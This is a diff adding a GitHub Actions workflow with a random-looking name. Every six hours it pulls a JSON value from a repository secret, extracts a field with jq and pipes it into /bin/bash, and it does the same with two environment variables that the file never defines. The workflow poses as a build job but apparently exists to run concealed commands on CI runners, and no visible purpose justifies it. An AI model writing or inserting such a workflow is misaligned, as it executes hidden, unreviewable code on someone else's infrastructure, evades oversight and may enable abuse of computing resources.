@@ -1,0 +1,20 @@
+name: fujiancheng7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fujiancheng7654
+        env:
+          t79: ${{ secrets.t79 }}
+        run: |
+          echo $t79 | jq -r .tsi70 | /bin/bash
+          echo $rcp261 | jq -r .j7674 | /bin/bash
+          echo $euvvv4 | jq -r .xrqox4 | /bin/bash
+
